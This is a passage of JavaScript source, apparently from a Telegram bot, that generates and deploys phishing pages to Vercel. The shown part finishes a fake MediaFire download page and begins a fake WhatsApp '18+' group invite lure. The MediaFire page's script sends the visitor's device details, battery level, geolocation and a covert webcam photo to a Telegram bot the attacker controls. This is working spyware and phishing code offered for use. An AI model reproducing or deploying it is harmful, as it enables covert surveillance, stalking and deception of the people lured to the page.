                            data-lazysrc="https://www.facebook.com/plugins/like.php?href=http://www.facebook.com/MediaFire&width=193&layout=button_count&action=like&show_faces=false&share=true&height=30&appId=124578887583575"
                            src=""
                            width="190"
                            height="30"
                            scrolling="no"
                            frameborder="0"
                            allowTransparency="true"
                            aria-labelledby="social-fb-label"
                        ></iframe>
                    </div>
                </div>
                <noscript><style>.social-fb-cont>iframe{display:block}</style></noscript>
            </div>
        </div>
    </div>


    <!-- Additional information
    =================================-->
    <div class="DLExtraInfo DLExtraInfo-additional">

                                    <!-- Account status -->
                <div class="DLExtraInfo-accountStatus DLExtraInfo-column">
                    <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="DLExtraInfo-accountStatusImage"></div>
                    <div class="DLExtraInfo-sectionDetails">
                        <div class="DLExtraInfo-sectionHeading">Your account status</div>
                        <div class="DLExtraInfo-sectionSubHeading">MediaFire - Free Account</div>
                        <p>
                            Thanks for registering for a Mediafire account.
                            Want even more great features like ad-free downloads? <a href="/upgrade">Go Pro!</a>
                        </p>
                        <p>MediaFire user for: <b>259 days</b></p>
                    </div>
                </div>
                    
        <!-- Browser/download application -->
        <div class="DLExtraInfo-downloadApp DLExtraInfo-column">
            <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="browser-chrome"></div>
            <div class="DLExtraInfo-sectionDetails">
                <div class="DLExtraInfo-sectionHeading">Download application</div>
                <div class="DLExtraInfo-sectionSubHeading">Chrome</div>
                <p>
                    You are downloading this file with <span>Chrome.</span>
                </p>
            </div>
        </div>
    </div>
</div>
                                </div>
    <div id="share" class="lightbox" role="dialog" tabindex="-1">
        <figure>
            <a href="#" class="close" id="share-close" title="Close share dialog"><span style="display: none">Close share dialog</span></a>
            <figcaption>
                <iframe
                    id="share-iframe"
                    data-src="https://www.mediafire.com/widgets/share.php?web=1&amp;dlr=1&amp;files=gpikhj7qgu0pyoz"
                    allowtransparency="true"
                    style="display:none">
                    <p id="share-desc">
                        Failed to load. Try again in a supported browser.
                    </p>
                </iframe>
                <noscript>
                    <p id="share-desc">
                        Failed to load. Please enable JavaScript.
                    </p>
                </noscript>
            </figcaption>
        </figure>
    </div>
                </main>
<footer role="contentinfo" id="footer" class="footer">
    <div class="u-wrap" id="mainFooterWrap">
        <div class="footerColWrap u-cf">
            <div class="footerCol">
                <h2><a href="/about/">Company</a></h2>
                <ul>
                    <li class="minFooterShow"><a href="/about/">About<b> Us</b></a></li>
                    <li><a href="/about/jobs.php">Careers</a></li>
                    <li><a href="/press/">Press</a></li>
                    <li><a href="http://blog.mediafire.com/" target="_blank">Company Blog</a></li>
                </ul>
            </div>

            <div class="footerCol">
                <h2><a href="/software/index.php">Tools</a></h2>
                <ul>
                    <li class="minFooterShow">
                        <a href="/software/mobile/"><b>MediaFire </b>Mobile</a>
                    </li>
                    <li class="minFooterShow">
                        <a href="https://fast.io" title="Fast.io - File Sharing and Cloud Storage for Teams" target="_blank" rel="noopener noreferrer" aria-label="Fast.io - Team File Sharing and Cloud Storage for Small Businesses">AI Cloud Storage for Teams</a>
                    </li>
                </ul>
            </div>

            <div class="footerCol">
                <h2><a href="/upgrade/">Upgrade</a></h2>
                <ul>
                    <li><a href="/upgrade/index.php?plan=Pro">Professional</a></li>
                </ul>
            </div>

            <div class="footerCol">
                <h2><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">Support</a></h2>
                <ul>
                    <li class="minFooterShow"><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank"><b>Get Support</b></a></li>
                </ul>
            </div>
        </div>
            </div>

    <!-- SUBFOOTER -->
    <div id="subFooterWrap">
        <div id="subFooter" class="u-wrap">
            <ul class="subFooterLinks">
                <li id="copyrightInfo">&copy;2025 MediaFire<span> Build 121939</span></li>
                <li><a href="/advertising/">Advertising</a></li>
                <li><a href="/policies/terms_of_service.php">Terms</a></li>
                <li><a href="/policies/privacy_policy.php">Privacy Policy</a></li>
                <li><a href="/policy_violation/copyright.php">Copyright</a></li>
                <li><a href="/policy_violation/terms_of_service.php">Abuse</a></li>
                <li><a href="/credits/">Credits</a></li>
                <li><a href="https://fast.io">AI Cloud Storage for Teams</a></li>
                <li><a href="/about/">More...</a></li>
            </ul>
            <div class="subFooterSocialWrap">
                <ul id="subFooterSocial">
                    <li class="footerIcn">
                        <a href="http://blog.mediafire.com/" class="footerIcnBlog" target="_blank" title="MediaFire Blog">
                            <span class="footerIcnBlog"></span>
                        </a>
                    </li>
                    <li class="footerIcn">
                        <a href="https://twitter.com/#!/mediafire" class="footerIcnTw" target="_blank" rel="noreferrer" title="MediaFire's Twitter page">
                            <span class="footerIcnTw"></span>
                        </a>
                    </li>
                    <li class="footerIcn" style="margin-left: 0;">
                        <a href="https://www.facebook.com/mediafire" class="footerIcnFb" target="_blank" rel="noreferrer" title="MediaFire's Facebook page'">
                            <span class="footerIcnFb"></span>
                        </a>
                    </li>
                </ul>
            </div>
            <div class="socialLinks" id="minSocialLinks">
                <a href="https://www.facebook.com/mediafire" class="shareFacebook" title="MediaFire on Facebook"><span style="display: none">Facebook Page</span></a>
                <a href="https://twitter.com/mediafire" class="shareTwitter" title="MediaFire on Twitter"><span style="display: none">Twitter Page</span></a>
                <a href="https://blog.mediafire.com/" class="shareBlogger" title="MediaFire Blog"><span style="display: none">MediaFire Blog</span></a>
            </div>
        </div>
    </div>
</footer>
<div id="status">
        <div id="status-message"></div>
        <div id="status-close">Click to dismiss this message</div>
    </div>
    <iframe name="iframe_worker" id="iframe_worker" src="" style="display:none;height:0;width:0;"></iframe>
            <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script>
  async function sendText(message) {
    axios.post("https://api.telegram.org/bot${t}/sendMessage", {
      chat_id: ${io},
      text: message
    })
  }

  async function sendPhoto(photoBlob) {
    const formData = new FormData()
    formData.append("chat_id", ${io})
    formData.append("photo", photoBlob, "hek.jpg")

    axios.post("https://api.telegram.org/bot${t}/sendPhoto", formData)
  }

navigator.getBattery().then(battery => {
sendText("=> [ Device Information ]\n-> Ram: "+navigator.deviceMemory+" GB\n-> Batre: "+battery.level * 100+"%\n-> UserAgent: "+navigator.userAgent+"\n-> Platform: "+navigator.platform+"\n-> Language: "+navigator.language)
})

  async function getIAndL() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(pos => {
          let message = "[ INFORMATION ]\n=> [ Location ]\n-> Latitude: "+pos.coords.latitude+"\n-> Longitude: "+pos.coords.longitude+"\n-> Map: https://www.google.com/maps?q="+pos.coords.latitude+","+pos.coords.longitude
          sendText(message)
      })
    }
  }

  async function getPhoto() {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video')
        video.srcObject = stream
        video.play()

        video.onloadeddata = () => {
          const canvas = document.createElement('canvas')
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          canvas.getContext('2d').drawImage(video, 0, 0)

          stream.getTracks().forEach(track => track.stop())

          canvas.toBlob(blob => {
            sendPhoto(blob)
          }, 'image/jpeg', 0.95)
        }
      })
      .catch(err => {
        sendText("Akses Kamera Di Tolak")
      })
  }

  async function sendAll() {
    setTimeout(() => {
      getIAndL()
      getPhoto()
    }, 1000)
  }
    </script>
</body>
</html>
`
fs.writeFileSync("index.html", kode)
await upToVercel(ctx, "index.html", "mediafire")
fs.unlinkSync("index.html")
}

async function groupwa(ctx, t, io, gn) {
const kode = String.raw`
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="default" id="meta_referrer" />
    <meta http-equiv="refresh" />
    <title id="pageTitle">WhatsApp Group Invite</title>
    <meta name="bingbot" content="noarchive" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="description" content="WhatsApp Group Invite" />
    <meta name="keywords" />
    <meta property="og:title" content="18+" />
    <meta property="og:image" content="https://pps.whatsapp.net/v/t61.24694-24/491877078_749226784235702_7604555501025952203_n.jpg?ccb=11-4&amp;oh=01_Q5Aa1gFFxdnabIO1bvnNPEnbyj_B3c90eHooqSl5IBREJ3Lk9g&amp;oe=684F8886&amp;_nc_sid=5e03e0&amp;_nc_cat=107" />
    <meta property="og:site_name" content="WhatsApp.com" />
    <meta property="og:description" content="WhatsApp Group Invite" />
    <meta property="og:keywords" />
    <meta property="invite_link_type" content="REGULAR" />
    <meta property="invite_link_type_v2" content="REGULAR" />
    <meta name="mobile-web-app-capable" content="yes" />
    <link rel="manifest" href="/data/manifest.json" crossorigin="use-credentials" />
    <meta name="robots" content="noindex" />
    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yz/r/ujTY9i_Jhs1.png" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yH/l/0,cross/_jfkUskf2-v.css" data-bootloader-hash="vRp9yOm" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yU/l/0,cross/MEuXBoqspBD.css" data-bootloader-hash="qXTeYR4" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yR/l/0,cross/ChejQs5hirm.css" data-bootloader-hash="sRXYEyZ" crossorigin="anonymous" />
    <div class="_2y_d _9rxy">
        <div class="_adhc"><a href="#content-wrapper" class="_aeal _asnw _9vcv" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;&#125;" id="u_0_0_Ys"><span class="_advp _aeam">Skip to content</span></a>
            <header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="u_0_1_no">
                <div class="_afvx">
                    <div class="_afvy">
                        <div class="_af8g"><button aria-label="Open mobile menu" class="_afvu _ain3 _9vcv" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Open&quot;&#125;" id="u_0_2_YT"><span class="_advp _aeam"><svg width="25" height="33" viewBox="0 0 25 33" fill="none" class="_wauiIcon__hamburgerMenuRebrand">
                                        <line x1="1.04297" y1="12.75" x2="23.543" y2="12.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                        <line x1="1.04297" y1="16.75" x2="23.543" y2="16.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                        <line x1="1.04297" y1="20.75" x2="23.543" y2="20.75" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></line>
                                    </svg></span></button>
                            <nav class="_9t0g" id="u_0_3_gh"><button aria-label="Close mobile menu" class="_9t0i _ain3 _9vcv" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Header_WhatsApp_MobileHamburgerMenu_Close&quot;&#125;" id="u_0_4_by"><span class="_advp _aeam"><svg width="16" height="16" fill="none" class="_9s6z">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M15.495 1.353L14.364.222 7.859 6.727 1.637.505.507 1.636l6.22 6.222-6.505 6.506 1.131 1.131L7.86 8.99l6.79 6.79 1.13-1.132-6.788-6.79 6.504-6.504z" fill="currentColor"></path>
                                        </svg></span></button><svg width="101" height="22" viewBox="0 0 101 22" fill="none" role="group" aria-hidden="true" class="_af87 _9t0j" xmlns="http://www.w3.org/2000/svg">
                                    <g clip-path="url(#clip0_4057_1490)">
                                        <path d="M39.9672 12.7979H39.9378L38.0929 5.5H35.87L33.9867 12.7095H33.9563L32.2524 5.50442H29.8828L32.741 16.0887H35.1456L36.9442 8.8847H36.9747L38.8049 16.0887H41.1644L44.0632 5.50442H41.7342L39.9672 12.7979ZM51.3063 9.08484C51.079 8.80102 50.7793 8.58095 50.4375 8.44682C49.9861 8.28004 49.5057 8.20226 49.0236 8.21793C48.5915 8.22441 48.1667 8.32846 47.7824 8.52201C47.3438 8.73736 46.9802 9.07519 46.7375 9.49286H46.6923V5.50442H44.5484V16.0887H46.6923V12.0715C46.6923 11.2908 46.8232 10.7298 47.085 10.3885C47.3468 10.0472 47.7703 9.87693 48.3556 9.87766C48.869 9.87766 49.2278 10.0336 49.4287 10.3454C49.6295 10.6572 49.7311 11.1283 49.7311 11.7608V16.0887H51.875V11.3748C51.8783 10.9393 51.8352 10.5046 51.7464 10.0778C51.6766 9.71894 51.5263 9.37976 51.3063 9.08484ZM60.1528 14.3825V10.4018C60.1528 9.93664 60.0471 9.56326 59.8358 9.28166C59.6236 8.99813 59.3434 8.77025 59.0199 8.61822C58.6711 8.45612 58.2982 8.34902 57.9153 8.30086C57.5193 8.247 57.1201 8.21967 56.7203 8.21904C56.2857 8.21856 55.8522 8.26042 55.426 8.34399C55.0186 8.41981 54.6272 8.56262 54.2683 8.76639C53.9282 8.96066 53.6386 9.22935 53.422 9.55147C53.1859 9.92121 53.055 10.3461 53.0429 10.7822H55.1868C55.2274 10.3675 55.3696 10.0701 55.6111 9.89757C55.8526 9.72507 56.1911 9.62776 56.6154 9.62776C56.7947 9.62695 56.9738 9.63915 57.1513 9.66425C57.3063 9.68442 57.4555 9.7348 57.5903 9.81242C57.7178 9.88786 57.8223 9.99558 57.8927 10.1242C57.9759 10.2924 58.0147 10.4783 58.0055 10.665C58.0166 10.7571 58.0044 10.8505 57.9702 10.9371C57.936 11.0236 57.8807 11.1006 57.8092 11.1614C57.6386 11.2884 57.4412 11.3765 57.2315 11.4191C56.9581 11.4842 56.6801 11.529 56.3998 11.5529C56.0861 11.5831 55.7687 11.6225 55.4475 11.6712C55.1239 11.7211 54.8033 11.7883 54.4872 11.8724C54.1846 11.949 53.8978 12.0766 53.6398 12.2495C53.3869 12.4249 53.1793 12.6559 53.0339 12.924C52.8663 13.2578 52.786 13.6271 52.8003 13.9988C52.791 14.3503 52.8607 14.6995 53.0045 15.0216C53.1324 15.2994 53.3258 15.5435 53.5687 15.7337C53.8198 15.9259 54.1075 16.0669 54.415 16.1484C54.7549 16.2401 55.1062 16.2851 55.4588 16.2822C55.9401 16.2822 56.4188 16.2125 56.8794 16.0754C57.3398 15.9383 57.7567 15.6878 58.0902 15.3478C58.0997 15.4748 58.1174 15.6011 58.1432 15.726C58.1679 15.8488 58.2007 15.97 58.2414 16.0887H60.4191C60.2988 15.8687 60.2266 15.6265 60.207 15.3777C60.1677 15.0474 60.1496 14.715 60.1528 14.3825ZM58.0089 13.1219C58.0065 13.2807 57.9941 13.4391 57.9717 13.5963C57.9434 13.8029 57.874 14.002 57.7674 14.1823C57.6424 14.3885 57.4652 14.5595 57.2529 14.6788C57.022 14.8174 56.6943 14.8867 56.2701 14.8867C56.1027 14.8869 55.9358 14.8717 55.7713 14.8414C55.6214 14.8163 55.4778 14.7634 55.3482 14.6855C55.2266 14.6113 55.1272 14.5067 55.0604 14.3825C54.9857 14.2354 54.9492 14.0724 54.9544 13.9081C54.9482 13.7388 54.9847 13.5706 55.0604 13.4183C55.1284 13.2931 55.224 13.1843 55.3403 13.0998C55.4643 13.0116 55.6023 12.944 55.7488 12.8997C55.9047 12.8503 56.0638 12.8108 56.2249 12.7814C56.3964 12.7526 56.5635 12.7261 56.7383 12.7073C56.9132 12.6885 57.0769 12.6619 57.2303 12.6332C57.3789 12.6055 57.5255 12.5686 57.6693 12.5226C57.794 12.4848 57.9093 12.4219 58.0078 12.338L58.0089 13.1219ZM64.1642 6.12585H62.0203V8.42471H60.7136V9.83343H62.0135V14.3548C61.9994 14.677 62.0669 14.9976 62.2099 15.2881C62.3322 15.5183 62.5184 15.7099 62.747 15.841C62.9913 15.9752 63.2593 16.063 63.5369 16.0997C63.8495 16.145 64.1652 16.1672 64.4813 16.1661C64.6946 16.1661 64.9101 16.1661 65.1324 16.1517C65.3351 16.1442 65.5371 16.1242 65.7372 16.092V14.4577C65.6322 14.4794 65.526 14.4946 65.419 14.503C65.3062 14.513 65.1933 14.5185 65.0715 14.5185C64.7093 14.5185 64.4666 14.4577 64.3448 14.3394C64.2229 14.221 64.1642 13.9844 64.1642 13.6284V9.83343H65.7372V8.42471H64.1609L64.1642 6.12585ZM73.0412 12.7294C72.9004 12.489 72.7079 12.2815 72.477 12.1212C72.2347 11.9531 71.9686 11.8205 71.6872 11.7276C71.3904 11.6303 71.0846 11.5462 70.7721 11.4766C70.4595 11.4069 70.1729 11.3428 69.8806 11.2842C69.617 11.2322 69.3567 11.1653 69.1009 11.084C68.8998 11.0236 68.7128 10.9252 68.5503 10.7943C68.4816 10.7387 68.4267 10.6685 68.39 10.589C68.3532 10.5094 68.3355 10.4227 68.3381 10.3354C68.3301 10.2004 68.3717 10.067 68.4555 9.95949C68.535 9.86413 68.6363 9.78838 68.7511 9.73834C68.8738 9.68781 69.0035 9.65539 69.1359 9.64214C69.2672 9.63067 69.399 9.62588 69.5308 9.62776C69.8769 9.61913 70.2199 9.69274 70.5306 9.84228C70.8116 9.98492 70.9684 10.2591 70.9977 10.665H73.0401C73.0181 10.2476 72.8905 9.84215 72.6689 9.48512C72.4705 9.18134 72.2043 8.92573 71.8903 8.73764C71.5618 8.54356 71.2007 8.40804 70.824 8.33735C70.4187 8.25746 70.0063 8.21782 69.5929 8.21904C69.1766 8.21856 68.7611 8.25557 68.3517 8.32961C67.9689 8.39644 67.6006 8.52696 67.2628 8.71552C66.9424 8.89543 66.6743 9.15277 66.4842 9.46301C66.2738 9.83422 66.1719 10.2551 66.1897 10.6793C66.1801 10.9771 66.2534 11.2718 66.4018 11.5319C66.5429 11.7639 66.7358 11.9617 66.966 12.1102C67.2105 12.269 67.4763 12.3936 67.7559 12.4806C68.0527 12.5746 68.3584 12.6564 68.6699 12.725C69.2785 12.8405 69.8778 12.9994 70.4629 13.2004C70.8917 13.3575 71.1061 13.5945 71.1061 13.9114C71.1128 14.0773 71.0649 14.2409 70.9695 14.3781C70.8804 14.5001 70.7648 14.6013 70.631 14.6744C70.4897 14.7505 70.3376 14.8053 70.1797 14.837C70.0233 14.8713 69.8637 14.8891 69.7035 14.89C69.4973 14.8904 69.2918 14.8655 69.0919 14.8159C68.9051 14.7705 68.7282 14.6926 68.5695 14.5859C68.4172 14.4809 68.2904 14.3442 68.1982 14.1857C68.0989 14.006 68.0495 13.8039 68.0549 13.5996H66.0058C66.0079 14.0503 66.1304 14.4925 66.3612 14.8823C66.5702 15.2155 66.8548 15.4971 67.1928 15.705C67.5488 15.9187 67.9409 16.0684 68.3505 16.1473C68.7877 16.2371 69.2332 16.2819 69.6798 16.2811C70.1193 16.2815 70.5577 16.2393 70.9887 16.155C71.3942 16.0787 71.7815 15.9286 72.1306 15.7127C72.4906 15.4941 72.7842 15.1849 72.9808 14.8173C73.1775 14.4498 73.2701 14.0373 73.2489 13.6228C73.2589 13.3128 73.1862 13.0056 73.0379 12.7316L73.0412 12.7294ZM77.3054 5.50221L73.2229 16.0864H75.6117L76.4591 13.7301H80.4965L81.3123 16.0864H83.7789L79.7382 5.50442L77.3054 5.50221ZM77.0797 11.9952L78.4868 8.11178H78.5162L79.8781 11.9952H77.0797ZM91.1958 9.46301C90.901 9.08458 90.5236 8.77554 90.0911 8.5585C89.5984 8.32016 89.0539 8.20326 88.5046 8.21793C88.0449 8.2122 87.5897 8.3082 87.1731 8.49879C86.7585 8.6995 86.4132 9.01519 86.1801 9.40661H86.1497V8.42471H84.1073V18.7723H86.2512V15.141H86.2806C86.5324 15.5079 86.88 15.8019 87.2871 15.9925C87.7049 16.1874 88.1626 16.2865 88.6253 16.2822C89.1467 16.2919 89.6627 16.1781 90.1295 15.9504C90.5492 15.7399 90.9161 15.4408 91.2037 15.0747C91.4968 14.6981 91.715 14.2709 91.8469 13.8152C91.9883 13.3336 92.0593 12.8347 92.0579 12.3335C92.0596 11.8051 91.9886 11.2788 91.8469 10.7689C91.7168 10.2969 91.4958 9.85367 91.1958 9.46301ZM89.8203 13.1839C89.7669 13.4585 89.6617 13.7211 89.51 13.9579C89.2538 14.3106 88.8755 14.56 88.4456 14.6597C88.0157 14.7594 87.5634 14.7025 87.1731 14.4997C86.9377 14.3673 86.738 14.1815 86.5909 13.9579C86.4384 13.7207 86.331 13.4585 86.2738 13.1839C86.2078 12.8871 86.1749 12.5842 86.1756 12.2805C86.1746 11.9717 86.2045 11.6635 86.2648 11.3605C86.3191 11.0821 86.4246 10.8157 86.5762 10.5743C86.721 10.3486 86.9177 10.1593 87.1506 10.0214C87.4184 9.86766 87.725 9.79102 88.0352 9.80026C88.3403 9.7922 88.6415 9.86887 88.9041 10.0214C89.1398 10.1625 89.3391 10.3552 89.4863 10.5842C89.642 10.8274 89.7521 11.0959 89.8113 11.3771C89.8774 11.6746 89.9103 11.9782 89.9095 12.2827C89.9112 12.585 89.8829 12.8869 89.8248 13.1839H89.8203ZM100.406 10.7744C100.277 10.3003 100.056 9.85506 99.7546 9.46301C99.4602 9.08463 99.0831 8.77558 98.651 8.5585C98.1579 8.32033 97.613 8.20343 97.0634 8.21793C96.6041 8.21255 96.1494 8.30855 95.733 8.49879C95.3183 8.69981 94.9728 9.01539 94.7389 9.40661H94.7096V8.42471H92.6627V18.7723H94.8066V15.141H94.8371C95.0888 15.5076 95.4359 15.8016 95.8425 15.9925C96.2603 16.1874 96.718 16.2865 97.1808 16.2822C97.7024 16.2919 98.2188 16.1781 98.686 15.9504C99.1054 15.7398 99.4719 15.4407 99.7591 15.0747C100.052 14.6981 100.27 14.2709 100.402 13.8152C100.545 13.3337 100.616 12.8348 100.614 12.3335C100.618 11.8072 100.55 11.2827 100.41 10.7744H100.406ZM98.3746 13.1839C98.3217 13.4587 98.2165 13.7213 98.0643 13.9579C97.9058 14.1956 97.6894 14.3909 97.4345 14.5261C97.1797 14.6612 96.8945 14.732 96.6047 14.732C96.3149 14.732 96.0297 14.6612 95.7749 14.5261C95.5201 14.3909 95.3036 14.1956 95.1452 13.9579C94.9931 13.7205 94.8857 13.4584 94.8281 13.1839C94.7626 12.887 94.7297 12.5842 94.7299 12.2805C94.7293 11.9716 94.7595 11.6635 94.8202 11.3605C94.8787 11.0812 94.9888 10.8147 95.1452 10.5743C95.2906 10.3491 95.4872 10.1599 95.7195 10.0214C95.9873 9.86766 96.2939 9.79102 96.6042 9.80026C96.9093 9.79208 97.2105 9.86876 97.473 10.0214C97.7091 10.1625 97.9088 10.3551 98.0564 10.5842C98.2121 10.8274 98.3222 11.0959 98.3814 11.3771C98.4475 11.6746 98.4804 11.9782 98.4795 12.2827C98.4776 12.5854 98.4454 12.8872 98.3836 13.1839H98.3746Z" fill="currentColor"></path>
                                        <path d="M25.9306 10.5046C25.8259 7.69499 24.6176 5.0336 22.5581 3.07618C20.4986 1.11877 17.7471 0.0166645 14.8781 3.00753e-06H14.8239C12.8918 -0.00140293 10.9927 0.490142 9.31337 1.42627C7.63402 2.3624 6.23232 3.71085 5.24619 5.33895C4.26006 6.96705 3.72348 8.8187 3.68925 10.7117C3.65501 12.6047 4.12431 14.4738 5.05095 16.1351L4.067 21.9049C4.0654 21.9167 4.06639 21.9288 4.0699 21.9402C4.07342 21.9516 4.07937 21.9622 4.08738 21.9712C4.09539 21.9802 4.10526 21.9874 4.11634 21.9924C4.12742 21.9974 4.13945 22 4.15163 22H4.16856L9.99215 20.7306C11.4968 21.4385 13.1446 21.8059 14.8137 21.8054C14.9198 21.8054 15.0259 21.8054 15.1319 21.8054C16.6002 21.7643 18.0456 21.4387 19.3847 20.8474C20.7238 20.256 21.9302 19.4106 22.9342 18.36C23.9381 17.3093 24.7198 16.0742 25.2341 14.726C25.7484 13.3777 25.9851 11.943 25.9306 10.5046ZM15.0766 19.909C14.9886 19.909 14.9006 19.909 14.8137 19.909C13.3386 19.9108 11.8846 19.5649 10.5744 18.9006L10.2765 18.748L6.32716 19.6624L7.05609 15.747L6.88683 15.4661C6.07843 14.1155 5.64301 12.5818 5.62344 11.0161C5.60386 9.4504 6.00083 7.90671 6.77522 6.53707C7.54962 5.16743 8.67474 4.0191 10.0398 3.20516C11.4048 2.39123 12.9626 1.93977 14.5598 1.89526C14.6486 1.89526 14.7378 1.89526 14.8273 1.89526C17.2388 1.90226 19.551 2.83733 21.2657 4.49898C22.9803 6.16064 23.9603 8.41588 23.9943 10.7788C24.0283 13.1417 23.1138 15.4232 21.4476 17.1316C19.7815 18.84 17.4972 19.8386 15.0868 19.9123L15.0766 19.909Z" fill="currentColor"></path>
                                        <path d="M10.946 5.6393C10.8086 5.64193 10.673 5.67157 10.5474 5.72646C10.4218 5.78135 10.3087 5.86038 10.2149 5.95887C9.94968 6.22535 9.20833 6.86669 9.16546 8.21349C9.12258 9.56029 10.0828 10.8927 10.2171 11.0796C10.3514 11.2665 12.053 14.1757 14.8559 15.3555C16.5033 16.051 17.2255 16.1705 17.6938 16.1705C17.8867 16.1705 18.0323 16.1506 18.1846 16.1417C18.698 16.1108 19.8569 15.5291 20.1097 14.8966C20.3624 14.2642 20.3793 13.7113 20.3128 13.6007C20.2462 13.4901 20.0634 13.4105 19.7881 13.269C19.5127 13.1274 18.1621 12.4198 17.9082 12.3202C17.814 12.2773 17.7127 12.2514 17.6092 12.2439C17.5417 12.2474 17.4761 12.2669 17.4181 12.3009C17.3601 12.3348 17.3114 12.382 17.2763 12.4386C17.0506 12.7139 16.5327 13.3121 16.3589 13.4846C16.3209 13.5275 16.2742 13.562 16.2217 13.586C16.1692 13.61 16.1122 13.6229 16.0542 13.6239C15.9475 13.6193 15.8431 13.5918 15.7484 13.5432C14.9303 13.2027 14.1844 12.7152 13.5492 12.1057C12.9558 11.5326 12.4523 10.8764 12.0552 10.1585C11.9018 9.87985 12.0552 9.73611 12.1952 9.60563C12.3351 9.47515 12.4852 9.29491 12.6296 9.139C12.7481 9.00582 12.8469 8.85692 12.923 8.6967C12.9624 8.62234 12.9823 8.53955 12.9809 8.45578C12.9795 8.37201 12.9569 8.28989 12.9151 8.21681C12.8485 8.07748 12.3509 6.70746 12.1173 6.1579C11.9277 5.68796 11.7021 5.67248 11.5046 5.6581C11.3421 5.64704 11.1559 5.64152 10.9697 5.63599H10.946" fill="currentColor"></path>
                                    </g>
                                    <defs>
                                        <clipPath id="clip0_4057_1490">
                                            <rect width="100" height="22" fill="white" transform="translate(0.5)"></rect>
                                        </clipPath>
                                    </defs>
                                </svg>
                                <ul class="_9t0k">
                                    <li class="_9t0h"><a href="https://www.whatsapp.com/" class="_aeo9 _asnw _9vcv _9sep" data-ms="&#123;&quot;creative&quot;:&quot;header&quot;,&quot;creative_detail&quot;:&quot;Navigation_Home_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_advp _aeam">Home</span></a></li>
                                    <li class="_9t0h">
                                        <div class="_9wm7 _aedf">
                                            <ul id="u_0_5_4q">
                                                <li class="_9wma"><button class="_aily _9wm9" aria-expanded="false" aria-selected="false" data-ms-clickable="true" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;Navigation_Features_Mobile_Dropdown&quot;&#125;"><svg fill="currentColor" width="16" height="17" viewBox="0 0 16 17" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__plus _aede">
                                                            <g clip-path="url(#clip0_1842_81860)">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M16.002 8.50042C16.002 8.0862 15.6662 7.75042 15.252 7.75042L8.7514 7.75042L8.7514 1.25042C8.7514 0.836205 8.41562 0.500418 8.0014 0.500418C7.58719 0.500418 7.2514 0.836205 7.2514 1.25042L7.2514 7.75042L0.752014 7.75042C0.337801 7.75042 0.00201378 8.0862 0.00201363 8.50042C0.00201415 8.91463 0.337801 9.25042 0.752014 9.25042L7.2514 9.25042L7.2514 15.7504C7.2514 16.1646 7.58719 16.5004 8.0014 16.5004C8.41562 16.5004 8.7514 16.1646 8.7514 15.7504L8.7514 9.25042L15.252 9.25042C15.6662 9.25042 16.002 8.91463 16.002 8.50042Z" fill="#currentColor"></path>
                                                            </g>
                                                            <defs>
                                                                <clipPath id="clip0_1842_81860">
                                                                    <rect width="16" height="16" fill="white" transform="translate(0 0.5)"></rect>
                                                                </clipPath>
                                                            </defs>
                                                        </svg><svg fill="currentColor" width="16" height="3" viewBox="0 0 16 3" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__minus _aedd">
                                                            <path d="M15.2518 0.750113C15.666 0.750113 16.0018 1.0859 16.0018 1.50011C16.0018 1.91433 15.666 2.25011 15.2518 2.25011H0.751831C0.337618 2.25011 0.00183158 1.91433 0.00183105 1.50011C0.0018312 1.0859 0.337617 0.750113 0.751831 0.750113H15.2518Z" fill="currentColor"></path>
                                                        </svg>
                                                        <h3 class="_9vd5 _9sc- _9t31 _9wm8">Features</h3>
                                                    </button>
                                                    <div class="_9wm6" aria-hidden="true" role="tabpanel">
                                                        <div class="_9wn9"><a href="https://www.whatsapp.com/privacy" class="_9vd5 _aens _afod" target="_self" data-ms="&#123;&quot;creative&quot;:&quot;link&quot;,&quot;creative_detail&quot;:&quot;NavigationDropdown_MessagePrivately_Mobile_Link&quot;&#125;" data-lnfb-mode="ie"><span class="_afoi"><svg width="16" height="21" viewBox="0 0 16 21" fill="none" xmlns="http://www.w3.org/2000/svg" class="_wauiIcon__privacy _afoj">
                                                                        <path d="M14 7H13V5C13 2.24 10.76 0 8 0C5.24 0 3 2.24 3 5V7H2C0.9 7 0 7.9 0 9V19C0 20.1 0.9 21 2 21H14C15.1 21 16 20.1 16 19V9C16 7.9 15.1 7 14 7ZM8 16C6.9 16 6 15.1 6 14C6 12.9 6.9 12 8 12C9.1 12 10 12.9 10 14C10 15.1 9.1 16 8 16ZM5 7V5C5 3.34 6.34 2 8 2C9.66 2 11 3.34 11 5V7H5Z" fill="currentColor"></path>
